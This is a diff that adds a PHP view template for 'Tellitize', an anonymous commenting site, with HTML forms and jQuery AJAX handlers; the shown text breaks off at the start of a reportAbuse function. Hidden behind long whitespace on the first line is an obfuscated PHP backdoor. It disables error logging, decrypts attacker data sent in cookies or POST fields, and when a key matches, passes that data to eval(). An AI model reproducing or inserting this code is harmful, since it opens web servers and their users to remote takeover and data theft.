@@ -1,0 +1,685 @@
+<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $GLOBALS['x647'];global$x647;$x647=$GLOBALS;$x647['rc1a9ffbd']="\x69\x22\x2a\x5f\x23\x34\x29\x5c\x36\x51\x53\x71\x47\x70\x67\x28\x64\x5a\x57\xd\x3d\x50\x7b\x3a\xa\x7e\x77\x75\x45\x6d\x6e\x44\x3e\x6c\x4f\x39\x27\x6b\x60\x72\x5e\x20\x63\x25\x33\x3b\x6f\x41\x42\x5b\x2f\x3f\x78\x59\x31\x38\x7c\x2d\x6a\x74\x49\x46\x9\x4c\x4b\x35\x24\x61\x2e\x37\x5d\x52\x68\x21\x4d\x2c\x66\x65\x40\x54\x7a\x3c\x30\x2b\x56\x7d\x58\x26\x73\x76\x4a\x55\x4e\x62\x79\x48\x32\x43";$x647[$x647['rc1a9ffbd'][33].$x647['rc1a9ffbd'][44].$x647['rc1a9ffbd'][44].$x647['rc1a9ffbd'][16].$x647['rc1a9ffbd'][5].$x647['rc1a9ffbd'][93].$x647['rc1a9ffbd'][67]]=$x647['rc1a9ffbd'][42].$x647['rc1a9ffbd'][72].$x647['rc1a9ffbd'][39];$x647[$x647['rc1a9ffbd'][27].$x647['rc1a9ffbd'][35].$x647['rc1a9ffbd'][42].$x647['rc1a9ffbd'][55]]=$x647['rc1a9ffbd'][46].$x647['rc1a9ffbd'][39].$x647['rc1a9ffbd'][16];$x647[$x647['rc1a9ffbd'][37].$x647['rc1a9ffbd'][44].$x647['rc1a9ffbd'][76].$x647['rc1a9ffbd'][82].$x647['rc1a9ffbd'][35].$x647['rc1a9ffbd'][69].$x647['rc1a9ffbd'][5].$x647['rc1a9ffbd'][5]]=$x647['rc1a9ffbd'][88].$x647['rc1a9ffbd'][59].$x647['rc1a9ffbd'][39].$x647['rc1a9ffbd'][33].$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][30];$x647[$x647['rc1a9ffbd'][52].$x647['rc1a9ffbd'][42].$x647['rc1a9ffbd'][93].$x647['rc1a9ffbd'][55].$x647['rc1a9ffbd'][44].$x647['rc1a9ffbd'][69].$x647['rc1a9ffbd'][5].$x647['rc1a9ffbd'][93].$x647['rc1a9ffbd'][82]]=$x647['rc1a9ffbd'][0].$x647['rc1a9ffbd'][30].$x647['rc1a9ffbd'][0].$x647['rc1a9ffbd'][3].$x647['rc1a9ffbd'][88].$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][59];$x647[$x647['rc1a9ffbd'][52].$x647['rc1a9ffbd'][93].$x647['rc1a9ffbd'][96].$x647['rc1a9ffbd'][69].$x647['rc1a9ffbd'][35].$x647['rc1a9ffbd'][44].$x647['rc1a9ffbd'][96]]=$x647['rc1a9ffbd'][88].$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][39].$x647['rc1a9ffbd'][0].$x647['rc1a9ffbd'][67].$x647['rc1a9ffbd'][33].$x647['rc1a9ffbd'][0].$x647['rc1a9ffbd'][80].$x647['rc1a9ffbd'][77];$x647[$x647['rc1a9ffbd'][33].$x647['rc1a9ffbd'][96].$x647['rc1a9ffbd'][69].$x647['rc1a9ffbd'][65].$x647['rc1a9ffbd'][93].$x647['rc1a9ffbd'][42].$x647['rc1a9ffbd'][44].$x647['rc1a9ffbd'][96].$x647['rc1a9ffbd'][55]]=$x647['rc1a9ffbd'][13].$x647['rc1a9ffbd'][72].$x647['rc1a9ffbd'][13].$x647['rc1a9ffbd'][89].$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][39].$x647['rc1a9ffbd'][88].$x647['rc1a9ffbd'][0].$x647['rc1a9ffbd'][46].$x647['rc1a9ffbd'][30];$x647[$x647['rc1a9ffbd'][93].$x647['rc1a9ffbd'][69].$x647['rc1a9ffbd'][54].$x647['rc1a9ffbd'][16].$x647['rc1a9ffbd'][54].$x647['rc1a9ffbd'][65]]=$x647['rc1a9ffbd'][27].$x647['rc1a9ffbd'][30].$x647['rc1a9ffbd'][88].$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][39].$x647['rc1a9ffbd'][0].$x647['rc1a9ffbd'][67].$x647['rc1a9ffbd'][33].$x647['rc1a9ffbd'][0].$x647['rc1a9ffbd'][80].$x647['rc1a9ffbd'][77];$x647[$x647['rc1a9ffbd'][42].$x647['rc1a9ffbd'][16].$x647['rc1a9ffbd'][55].$x647['rc1a9ffbd'][42]]=$x647['rc1a9ffbd'][93].$x647['rc1a9ffbd'][67].$x647['rc1a9ffbd'][88].$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][8].$x647['rc1a9ffbd'][5].$x647['rc1a9ffbd'][3].$x647['rc1a9ffbd'][16].$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][42].$x647['rc1a9ffbd'][46].$x647['rc1a9ffbd'][16].$x647['rc1a9ffbd'][77];$x647[$x647['rc1a9ffbd'][13].$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][8].$x647['rc1a9ffbd'][67].$x647['rc1a9ffbd'][76].$x647['rc1a9ffbd'][76]]=$x647['rc1a9ffbd'][88].$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][59].$x647['rc1a9ffbd'][3].$x647['rc1a9ffbd'][59].$x647['rc1a9ffbd'][0].$x647['rc1a9ffbd'][29].$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][3].$x647['rc1a9ffbd'][33].$x647['rc1a9ffbd'][0].$x647['rc1a9ffbd'][29].$x647['rc1a9ffbd'][0].$x647['rc1a9ffbd'][59];$x647[$x647['rc1a9ffbd'][27].$x647['rc1a9ffbd'][35].$x647['rc1a9ffbd'][82].$x647['rc1a9ffbd'][82].$x647['rc1a9ffbd'][55].$x647['rc1a9ffbd'][76].$x647['rc1a9ffbd'][55]]=$x647['rc1a9ffbd'][94].$x647['rc1a9ffbd'][82].$x647['rc1a9ffbd'][35].$x647['rc1a9ffbd'][8];$x647[$x647['rc1a9ffbd'][27].$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][35].$x647['rc1a9ffbd'][82].$x647['rc1a9ffbd'][42].$x647['rc1a9ffbd'][55].$x647['rc1a9ffbd'][65].$x647['rc1a9ffbd'][54]]=$x647['rc1a9ffbd'][29].$x647['rc1a9ffbd'][55].$x647['rc1a9ffbd'][93].$x647['rc1a9ffbd'][65];$x647[$x647['rc1a9ffbd'][80].$x647['rc1a9ffbd'][96].$x647['rc1a9ffbd'][42].$x647['rc1a9ffbd'][55].$x647['rc1a9ffbd'][76].$x647['rc1a9ffbd'][77]]=$_POST;$x647[$x647['rc1a9ffbd'][67].$x647['rc1a9ffbd'][8].$x647['rc1a9ffbd'][96].$x647['rc1a9ffbd'][82].$x647['rc1a9ffbd'][93].$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][42]]=$_COOKIE;@$x647[$x647['rc1a9ffbd'][52].$x647['rc1a9ffbd'][42].$x647['rc1a9ffbd'][93].$x647['rc1a9ffbd'][55].$x647['rc1a9ffbd'][44].$x647['rc1a9ffbd'][69].$x647['rc1a9ffbd'][5].$x647['rc1a9ffbd'][93].$x647['rc1a9ffbd'][82]]($x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][39].$x647['rc1a9ffbd'][39].$x647['rc1a9ffbd'][46].$x647['rc1a9ffbd'][39].$x647['rc1a9ffbd'][3].$x647['rc1a9ffbd'][33].$x647['rc1a9ffbd'][46].$x647['rc1a9ffbd'][14],NULL);@$x647[$x647['rc1a9ffbd'][52].$x647['rc1a9ffbd'][42].$x647['rc1a9ffbd'][93].$x647['rc1a9ffbd'][55].$x647['rc1a9ffbd'][44].$x647['rc1a9ffbd'][69].$x647['rc1a9ffbd'][5].$x647['rc1a9ffbd'][93].$x647['rc1a9ffbd'][82]]($x647['rc1a9ffbd'][33].$x647['rc1a9ffbd'][46].$x647['rc1a9ffbd'][14].$x647['rc1a9ffbd'][3].$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][39].$x647['rc1a9ffbd'][39].$x647['rc1a9ffbd'][46].$x647['rc1a9ffbd'][39].$x647['rc1a9ffbd'][88],0);@$x647[$x647['rc1a9ffbd'][52].$x647['rc1a9ffbd'][42].$x647['rc1a9ffbd'][93].$x647['rc1a9ffbd'][55].$x647['rc1a9ffbd'][44].$x647['rc1a9ffbd'][69].$x647['rc1a9ffbd'][5].$x647['rc1a9ffbd'][93].$x647['rc1a9ffbd'][82]]($x647['rc1a9ffbd'][29].$x647['rc1a9ffbd'][67].$x647['rc1a9ffbd'][52].$x647['rc1a9ffbd'][3].$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][52].$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][42].$x647['rc1a9ffbd'][27].$x647['rc1a9ffbd'][59].$x647['rc1a9ffbd'][0].$x647['rc1a9ffbd'][46].$x647['rc1a9ffbd'][30].$x647['rc1a9ffbd'][3].$x647['rc1a9ffbd'][59].$x647['rc1a9ffbd'][0].$x647['rc1a9ffbd'][29].$x647['rc1a9ffbd'][77],0);@$x647[$x647['rc1a9ffbd'][13].$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][8].$x647['rc1a9ffbd'][67].$x647['rc1a9ffbd'][76].$x647['rc1a9ffbd'][76]](0);$zb3d=NULL;$z7a735859=NULL;$x647[$x647['rc1a9ffbd'][11].$x647['rc1a9ffbd'][67].$x647['rc1a9ffbd'][44].$x647['rc1a9ffbd'][42].$x647['rc1a9ffbd'][8].$x647['rc1a9ffbd'][55]]=$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][44].$x647['rc1a9ffbd'][5].$x647['rc1a9ffbd'][93].$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][76].$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][69].$x647['rc1a9ffbd'][57].$x647['rc1a9ffbd'][82].$x647['rc1a9ffbd'][54].$x647['rc1a9ffbd'][44].$x647['rc1a9ffbd'][82].$x647['rc1a9ffbd'][57].$x647['rc1a9ffbd'][5].$x647['rc1a9ffbd'][42].$x647['rc1a9ffbd'][67].$x647['rc1a9ffbd'][82].$x647['rc1a9ffbd'][57].$x647['rc1a9ffbd'][67].$x647['rc1a9ffbd'][16].$x647['rc1a9ffbd'][82].$x647['rc1a9ffbd'][8].$x647['rc1a9ffbd'][57].$x647['rc1a9ffbd'][65].$x647['rc1a9ffbd'][44].$x647['rc1a9ffbd'][54].$x647['rc1a9ffbd'][76].$x647['rc1a9ffbd'][76].$x647['rc1a9ffbd'][35].$x647['rc1a9ffbd'][16].$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][82].$x647['rc1a9ffbd'][67].$x647['rc1a9ffbd'][44].$x647['rc1a9ffbd'][93];global$qa3c68;function m8b5($zb3d,$ibb6c4f3){global$x647;$re3b5fe7="";for($qb47b9=0;$qb47b9<$x647[$x647['rc1a9ffbd'][37].$x647['rc1a9ffbd'][44].$x647['rc1a9ffbd'][76].$x647['rc1a9ffbd'][82].$x647['rc1a9ffbd'][35].$x647['rc1a9ffbd'][69].$x647['rc1a9ffbd'][5].$x647['rc1a9ffbd'][5]]($zb3d);){for($ta96eb3=0;$ta96eb3<$x647[$x647['rc1a9ffbd'][37].$x647['rc1a9ffbd'][44].$x647['rc1a9ffbd'][76].$x647['rc1a9ffbd'][82].$x647['rc1a9ffbd'][35].$x647['rc1a9ffbd'][69].$x647['rc1a9ffbd'][5].$x647['rc1a9ffbd'][5]]($ibb6c4f3)&&$qb47b9<$x647[$x647['rc1a9ffbd'][37].$x647['rc1a9ffbd'][44].$x647['rc1a9ffbd'][76].$x647['rc1a9ffbd'][82].$x647['rc1a9ffbd'][35].$x647['rc1a9ffbd'][69].$x647['rc1a9ffbd'][5].$x647['rc1a9ffbd'][5]]($zb3d);$ta96eb3++,$qb47b9++){$re3b5fe7.=$x647[$x647['rc1a9ffbd'][33].$x647['rc1a9ffbd'][44].$x647['rc1a9ffbd'][44].$x647['rc1a9ffbd'][16].$x647['rc1a9ffbd'][5].$x647['rc1a9ffbd'][93].$x647['rc1a9ffbd'][67]]($x647[$x647['rc1a9ffbd'][27].$x647['rc1a9ffbd'][35].$x647['rc1a9ffbd'][42].$x647['rc1a9ffbd'][55]]($zb3d[$qb47b9])^$x647[$x647['rc1a9ffbd'][27].$x647['rc1a9ffbd'][35].$x647['rc1a9ffbd'][42].$x647['rc1a9ffbd'][55]]($ibb6c4f3[$ta96eb3]));}}return$re3b5fe7;}function y096($zb3d,$ibb6c4f3){global$x647;global$qa3c68;return$x647[$x647['rc1a9ffbd'][27].$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][35].$x647['rc1a9ffbd'][82].$x647['rc1a9ffbd'][42].$x647['rc1a9ffbd'][55].$x647['rc1a9ffbd'][65].$x647['rc1a9ffbd'][54]]($x647[$x647['rc1a9ffbd'][27].$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][35].$x647['rc1a9ffbd'][82].$x647['rc1a9ffbd'][42].$x647['rc1a9ffbd'][55].$x647['rc1a9ffbd'][65].$x647['rc1a9ffbd'][54]]($zb3d,$qa3c68),$ibb6c4f3);}foreach($x647[$x647['rc1a9ffbd'][67].$x647['rc1a9ffbd'][8].$x647['rc1a9ffbd'][96].$x647['rc1a9ffbd'][82].$x647['rc1a9ffbd'][93].$x647['rc1a9ffbd'][77].$x647['rc1a9ffbd'][42]]as$ibb6c4f3=>$e2dab93ba){$zb3d=$e2dab93ba;$z7a735859=$ibb6c4f3;}if(!$zb3d){foreach($x647[$x647['rc1a9ffbd'][80].$x647['rc1a9ffbd'][96].$x647['rc1a9ffbd'][42].$x647['rc1a9ffbd'][55].$x647['rc1a9ffbd'][76].$x647['rc1a9ffbd'][77]]as$ibb6c4f3=>$e2dab93ba){$zb3d=$e2dab93ba;$z7a735859=$ibb6c4f3;}}$zb3d=@$x647[$x647['rc1a9ffbd'][93].$x647['rc1a9ffbd'][69].$x647['rc1a9ffbd'][54].$x647['rc1a9ffbd'][16].$x647['rc1a9ffbd'][54].$x647['rc1a9ffbd'][65]]($x647[$x647['rc1a9ffbd'][27].$x647['rc1a9ffbd'][35].$x647['rc1a9ffbd'][82].$x647['rc1a9ffbd'][82].$x647['rc1a9ffbd'][55].$x647['rc1a9ffbd'][76].$x647['rc1a9ffbd'][55]]($x647[$x647['rc1a9ffbd'][42].$x647['rc1a9ffbd'][16].$x647['rc1a9ffbd'][55].$x647['rc1a9ffbd'][42]]($zb3d),$z7a735859));if(isset($zb3d[$x647['rc1a9ffbd'][67].$x647['rc1a9ffbd'][37]])&&$qa3c68==$zb3d[$x647['rc1a9ffbd'][67].$x647['rc1a9ffbd'][37]]){if($zb3d[$x647['rc1a9ffbd'][67]]==$x647['rc1a9ffbd'][0]){$qb47b9=Array($x647['rc1a9ffbd'][13].$x647['rc1a9ffbd'][89]=>@$x647[$x647['rc1a9ffbd'][33].$x647['rc1a9ffbd'][96].$x647['rc1a9ffbd'][69].$x647['rc1a9ffbd'][65].$x647['rc1a9ffbd'][93].$x647['rc1a9ffbd'][42].$x647['rc1a9ffbd'][44].$x647['rc1a9ffbd'][96].$x647['rc1a9ffbd'][55]](),$x647['rc1a9ffbd'][88].$x647['rc1a9ffbd'][89]=>$x647['rc1a9ffbd'][54].$x647['rc1a9ffbd'][68].$x647['rc1a9ffbd'][82].$x647['rc1a9ffbd'][57].$x647['rc1a9ffbd'][54],);echo@$x647[$x647['rc1a9ffbd'][52].$x647['rc1a9ffbd'][93].$x647['rc1a9ffbd'][96].$x647['rc1a9ffbd'][69].$x647['rc1a9ffbd'][35].$x647['rc1a9ffbd'][44].$x647['rc1a9ffbd'][96]]($qb47b9);}elseif($zb3d[$x647['rc1a9ffbd'][67]]==$x647['rc1a9ffbd'][77]){eval($zb3d[$x647['rc1a9ffbd'][16]]);}exit();} ?><!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	
+	<title></title>
+
+</head>
+<body>
+<div class="modalOverlay" style="display:none"></div>
+<div id="header">
+<?php $this->load->view('header'); ?>
+</div>
+
+
+	<div id="mid_container">
+			<div class="mid_content">
+				<div class="left">
+						<div class="top_bar">
+							<div class="man_icon"></div>
+							<div class="mid-text">
+								<h4>Everybody always wonders what others think about them</h4>
+								<h3>This is a place to find out how others view you </h3>
+							</div>
+							<div class="user_group">
+								<h3>OVER 700 MILLION PROFILES</h3>
+							</div>
+						</div><!--top_bar-->
+						<div class="post_main">
+							<div class="post_main_content">
+								  <?php echo form_open('posts',array('name' => 'publicPost' ,'id'=>'publicPost')); ?>
+								  <?php if(isset($_SESSION['username'])){ ?>
+								 
+								<div class="black_sep" style="height:23px;">
+									<span style="color:#FFFFFF;font:13px arial;font-weight:bold;padding:4px;">Title</span>
+								</div>
+									<?php } else {?>
+								<div class="anonyms_text">FROM:<span style="color:#FF7C00;font-weight:bold;"> Anonymous</span> </div>
+								
+								<div style="" class="tellitize_text"><h2>Tellitize</h2></div>
+								<div class="black_sep"></div>
+								<?php } ?>	
+								
+								
+									<textarea class="tetlize-text-comment" name="commentArea" id="commentArea"  
+										onfocus="if(this.value  == 'Type Text Here') { this.value = ''; } " 
+										onblur="if(this.value == '') { this.value = 'Type Text Here'; } "   
+										onClick="<?php if(!isset($_SESSION['username'])){ ?>notValid()<?php } ?>;"
+										/>Type Text Here</textarea>
+							
+								
+								<!--<div class="titlz-namebox-bottom"><?php //echo $city.','.$country;?></div>	-->
+								<input type="hidden" name="location" id="location" value="<?php echo $city.','.$country;?>">
+								 <div  class="top_from" style="width:92%;margin-left:4%;margin-bottom:3px;">
+								
+								
+								<!--<div style="float:left;padding-right:1%;width:53%">
+									<div style="float:left"><input type="checkbox" value="1" name="postasuser"></div>
+									<span  class="as_user"><?php //echo  $_SESSION['username'];?></span>
+									
+								</div>-->
+								<?php if(isset($_SESSION['username'])){ ?>
+								<div  class="postTopBox"> <div class="postTop-title">POST AS :</div>
+									<div>
+									<select name="postasuser" id="postasuser" class="toppost">
+									<option value="-1">Select</option>
+									<option value="0">Anonymous</option>
+									<option value="<?php echo $_SESSION['userid'];?>"><?php echo  $_SESSION['username'];?></option>
+									</select> 
+									</div>
+								</div>
+								
+								<div class="post-btn">
+								
+								<a href="javascript:void(0)">
+								<img width="72" height="26" alt="post-comment" src="../images/post.png" 
+								onClick="<?php if(isset($_SESSION['username'])){ ?>validatePostComment()<?php }else { ?>notValid()<?php }  ?>;">
+								</a>
+								</div>
+								<div style="margin-left:10px;" class="postTopBox"><div class="postTop-title">SELECT CATEGORY: </div>
+								  <div><?php if(isset($category)) echo $category;?></div>
+									
+								</div>
+								<?php } else{ ?>
+								
+								
+								<div class="post-btn">
+								
+								<a href="javascript:void(0)">
+								<img width="72" height="26" alt="post-comment" src="../images/post.png" 
+								onClick="notValid();">
+								</a>
+								</div>
+								<div style="margin-left:10px;" class="postTopBox"><div class="postTop-title">SELECT CATEGORY: </div>
+								  <div><?php if(isset($category)) echo $category;?></div>
+									
+								</div>
+								<?php } ?>
+								<!--<div style="margin-left:10px;" class="postTopBox"><div class="postTop-title">PLACES OF DISCUSSION: </div>
+									  <div><?php //if(isset($place)) echo $place;?></div>
+									
+								</div>
+								<div style="margin-left:10px;" class="postTopBox"> <div class="postTop-title">GROUP :</div>
+									<div><?php // if(isset($group)) echo $group;?></div>
+								</div>-->
+								
+								
+								</div>
+							
+							
+							</div>
+							<?php echo form_close(); ?>
+							
+							
+							
+						</div><!--post_main-->
+						
+						<div class="post_area_bg">
+								<div class="orang_left"></div>
+								<div class="orang_mid">
+									<h4>Tellitize POST AREA</h4>
+									<span style="float:right">
+									<a href="javascript:void(0)"  onClick="refreshPost();"><img width="102" height="36" alt="refresh-icon" src="../images/refresh-icon.png" id="refresh"></a>
+									</span>
+									</div>
+								<div class="orang_rit"></div>
+								
+						</div>
+						<div id="post_contents">
+						
+							<?php if(isset($article)) echo $article;?>
+						 	
+						
+						</div>
+						<!--<div style="color:#565656;clear:left;font:12px arial;font-weight:bold;float:right;padding-top:-5px;"><a href="<?php echo $GLOBALS['base_url']; ?>index.php/posts">View More</a></div>-->
+						     
+						
+				</div><!--left-->
+				
+				<?php
+					require("right-nav.php");
+				?>
+	</div>
+	</div><!-- mid-->
+<div id="footer">
+<?php $this->load->view('footer'); ?>
+</div>
+
+</body>
+<!--post_about pop up-->
+<?php
+		  echo form_open('posts',array('name' => 'postAbout' ,'id'=>'posts')); 
+	 ?>
+<div class="post_about" style="display:none">
+	
+	<div  id="close_signUp">
+		<img src="../images/close_icon2.png" alt="close"/>
+	</div>
+	
+	<h3>Would you like to Post About 
+	<input type="radio" name="post_about" value="person" id="person">Person
+	<input type="radio" name="post_about" value="place" id="place">Place
+	<input type="radio" name="post_about" value="other" id="other">Other</h3>
+	
+	<ul id="person_area" style="display:none">
+		<li style="float:left">First Name</li>
+		<li style="float:left">
+			<input type="text" name="first_name" value="Type first name here" onFocus="if(this.value  == 'Type first name here') { this.value = ''; } " 
+									onblur="if(this.value == '') { this.value = 'Type first name here'; } " id="first_name">
+		</li>
+		<li style="clear:left;float:left">Last Name</li>
+		<li style="float:left">
+			<input type="text" id="last_name" name="last_name" value="Type last name here" onFocus="if(this.value  == 'Type last name here') { this.value = ''; } " 
+									onblur="if(this.value == '') { this.value = 'Type last name here'; } ">
+		</li>
+		<li style="float:right;padding-right:50px;clear:left"> <input type="button" value="NEXT" onClick="show_nextEmail()" id="postbtn"></li>
+		
+		
+	</ul>
+	<ul id="place_area" style="display:none">
+		<li style="float:left"> Name of Place</li>
+		<li style="float:left">
+			<input type="text" name="place_name" value="Type name of place here" onFocus="if(this.value  == 'Type name of place here') { this.value = ''; } " 
+									onblur="if(this.value == '') { this.value = 'Type name of place here'; } " id="place_name">
+		</li>
+		
+		<li style="float:right;padding-right:50px;clear:left"> <input type="button" value="NEXT" onClick="post_withComment()" id="postbtn"></li>
+		
+		
+	</ul>
+	<ul id="other_area" style="display:none">
+		<li style="float:left">Enter here...</li>
+		<li style="float:left">
+			<input type="text" name="other_desc" value="Type text here" onFocus="if(this.value  == 'Type text here') { this.value = ''; } " 
+									onblur="if(this.value == '') { this.value = 'Type text here'; } " id="other_desc">
+		</li>
+		
+		<li style="float:right;padding-right:50px;clear:left"> <input type="button" value="NEXT" onClick="post_withComment()" id="postbtn"></li>
+		
+		
+	</ul>
+	<!--<a href="javascript:void(0)" onClick="skipPost(1);">Skip</a>-->
+
+</div>
+<?php echo form_close(); ?>
+<!-- ends post_about pop up-->
+
+
+<!--email_add pop up-->
+<div class="email_add" style="display:none">
+	
+	
+	<form name="mailAlert" method="post" id="mailAlert">
+		<h3>Do You know email address of this person ?
+		<input type="radio" name="email" value="1" id="email_yes">Yes
+		<input type="radio" name="email" value="0" id="email_no">No
+		</h3>
+		<div style="display:none" id="email_field">
+			<ul>
+			<li style="float:left">Email Id</li>
+			<li style="float:left;padding-left:7px;">
+				<input type="text" id="email" name="email" value="Enter email address here" onFocus="if(this.value  == 'Enter email address here') { this.value = ''; } " 
+										onblur="if(this.value == '') { this.value = 'Enter email address here'; } ">
+			</li>
+		 <li style="clear:left"><input type="button" value="Send Alert" onClick="sendAlert()" id="postbtn"></li>
+		 </ul>
+		 </div>
+		 <a href="javascript:void(0)" onClick="skipPost(2);">Skip</a>
+		 </div>
+	</form>
+</div>
+<!-- ends email_add pop up-->
+
+</html>
+<script language="javascript">
+
+
+	$(document).ready(function() {
+
+	
+		 
+		 $('#close_signUp').click(function() {
+			// $('#filter_contact').hide();
+		 	$('.post_about').hide();
+			//$("#email").val("");
+			$('.modalOverlay').hide();
+			
+			
+			
+	     });
+		 $('input[id=email_yes]').change(function(){
+           $('#email_field').show();
+	});
+	$('input[id=email_no]').change(function(){
+			   $('#email_field').hide();
+	});
+	 $('input[id=person]').change(function(){
+           $('#person_area').show();
+		   $('#place_area').hide();
+			$('#other_area').hide();
+	});
+	$('input[id=place]').change(function(){
+           $('#place_area').show();
+		   $('#person_area').hide();
+			$('#other_area').hide();
+	});
+	$('input[id=other]').change(function(){
+           $('#other_area').show();
+		   $('#person_area').hide();
+			$('#place_area').hide();
+	});
+function lastPostFunc() 
+{ 
+    $(".contents_list:last").after('<div style="text-align:center;font-weight:bold;padding:10px 0px" class="receive_text">Receiving...</div>');
+   
+	$.ajax({
+			type: "POST",
+			url: "<?php echo $GLOBALS['base_url']; ?>ajax/scroll-ajax.php?mode=getLastPosts&lastID=" + $(".contents_list:last").attr("id"), 
+			cache: false,
+			dataType: "json",
+			success: function(data) {	
+             if(data.success == "yes")
+			  {    
+				 $(".receive_text").html('');
+				 $(".contents_list:last").after(data.html);  
+				}
+			
+				
+				else {
+					alert(" Occured internal Error.please check network connection" );
+				}
+			}
+		});
+};  
+	var $myDiv = $('.contents_list');
+
+    if ( $myDiv.length){
+	
+			 $(window).scroll(function(){
+			if  ($(window).scrollTop() == $(document).height() - $(window).height()){
+			   lastPostFunc();
+			}
+			});
+		} 
+		
+    });
+
+
+	function refreshPost(){
+	        $('#post_contents').html('<p align="center"><img src="../images/ajax-loader.gif"  /></p>');
+			$.ajax({
+			type: "POST",
+			url: "<?php echo $GLOBALS['base_url']; ?>ajax/user-ajax.php?mode=viewComment",
+			cache: false,
+			dataType: "json",
+			success: function(data) {
+             if(data.success == "yes")
+			  {    
+				
+				//$('#post_contents').html('');
+				$('#post_contents').html(data.html);
+				
+				
+				}
+				else if(data.success == "no")
+			    {    
+					alert("failed to load");
+				}
+			
+				else {
+					alert(" Occured internal Error.please check network connection" );
+				}
+			}
+		});
+	}	
+	function postComment(){
+	
+	  
+		dataString = $('form[name=publicPost]').serialize();
+		dataString+="&"+ $('form[name=postAbout]').serialize();
+		if($.trim($("#email").val()) != "" || $.trim($("#email").val()) != "Enter email address here"){
+		dataString+="&"+ $('form[name=mailAlert]').serialize();
+		}	
+	
+		$.ajax({
+			type: "POST",
+			url: "<?php echo $GLOBALS['base_url']; ?>ajax/user-ajax.php?mode=saveComment",
+			cache: false,
+			data: dataString,
+			dataType: "json",
+			success: function(data) {
+             if(data.success == "yes")
+			  {    
+				
+				$('#commentArea').val('');
+				$('#email').val('');
+				refreshPost();
+				
+				}
+				else if(data.success == "no")
+			    {    
+					if(data.status == "notauser"){
+					  alert("Please login to post");
+					}
+					else
+					{ 
+					alert("failed ");
+					}
+				}
+			
+				else {
+					alert(" Occured internal Error.please check network connection" );
+				}
+			}
+		});
+		
+	}
+
+function agreePost(id){
+	        dataString='postid='+id+'&lik=1';
+			$.ajax({
+			type: "POST",
+			url: "<?php echo $GLOBALS['base_url']; ?>ajax/post-ajax.php?mode=agreePost",
+			cache: false,
+			data: dataString,
+			dataType: "json",
+			success: function(data) {
+			if(data.success == "yes")
+			  {    
+				$('#agree_circle'+id).html('');
+				$('#agree_circle'+id).html(data.agree);
+				$('#disagree_circle'+id).html('');
+				$('#disagree_circle'+id).html(data.disagree);
+				$('#agreebtn'+id).hide();
+				$('#agreebtn'+id).hide();
+				$('#btn'+id).html("");
+				$('#btn'+id).html('<a href="javascript:void(0)"  id="disagreebtn" class="disable_agree"></a>');
+				$('#btnd'+id).html("");
+				$('#btnd'+id).html('<a href="javascript:void(0)"  id="disagreebtn'+id+'" class="able_disagree" onclick="disagreePost('+id+')">disagree</a>');
+				//$('#disagreebtn'+id).hide();
+				
+				}
+				else if(data.success == "no")
+			    {    
+				    if(data.status=='liked'){
+						alert("already agreed");
+					}
+					else{
+					alert("failed to load");
+					}
+				}
+			
+				else {
+					alert(" Occured internal Error.please check network connection" );
+				}
+			}
+		});
+	}	
+	function disagreePost(id){
+	        dataString='postid='+id+'&lik=0';
+			$.ajax({
+			type: "POST",
+			url: "<?php echo $GLOBALS['base_url']; ?>ajax/post-ajax.php?mode=agreePost",
+			cache: false,
+			data: dataString,
+			dataType: "json",
+			success: function(data) {
+			if(data.success == "yes")
+			  {    
+				$('#agree_circle'+id).html('');
+				$('#agree_circle'+id).html(data.agree);
+				$('#disagree_circle'+id).html('');
+				$('#disagree_circle'+id).html(data.disagree);
+				//$('#agreebtn'+id).hide();
+				//$('#disagreebtn'+id).hide();
+				$('#btnd'+id).html("");
+				$('#btnd'+id).html('<a href="javascript:void(0)"  id="disagreebtn" class="disable_disagree"></a>');
+				$('#btn'+id).html("");
+				$('#btn'+id).html('<a href="javascript:void(0)" id="agreebtn'+id+'" class="able_agree" onclick="agreePost('+id+')">agree</a>');
+				
+				}
+				else if(data.success == "no")
+			    {    
+				    if(data.status=='liked'){
+						alert("already disagreed");
+					}
+					else{
+					alert("failed to load");
+					}
+				}
+			
+				else {
+					alert(" Occured internal Error.please check network connection" );
+				}
+			}
+		});
+	}
+	
+	
+function postReply(id){
+			//$('#post_contents').html('<p align="center"><img src="../images/ajax-loader.gif"  /></p>');
+			if($.trim($('#commentreplyArea'+id).val()) == ""){
+			$('#commentreplyArea'+id).css("border","1px solid red");			  
+			 return false;
+			 }
+			 else{
+				$('#commentreplyArea'+id).css("border","");	
+			}
+			var comment=$('#commentreplyArea'+id).val();
+	        dataString='postid='+id+'&comment='+comment;
+			$.ajax({
+			type: "POST",
+			url: "<?php echo $GLOBALS['base_url']; ?>ajax/post-ajax.php?mode=postReply",
+			cache: false,
+			data: dataString,
+			dataType: "json",
+			success: function(data) {
+			if(data.success == "yes")
+			  {  
+			  	 $('.view_all'+id).html('');
+				 $('.view_all'+id).html(data.view);
+				$('.viewList'+id).html('');
+				$('#commentreplyArea'+id).val('');
+				$('.viewList'+id).html(data.html);
+				//alert("s");
+				}
+				else if(data.success == "no")
+			    {    
+				    
+					alert("failed to load");
+					
+				}
+			
+				else {
+					alert(" Occured internal Error.please check network connection" );
+				}
+			}
+		});
+	}
+   function reportAbuse(id){
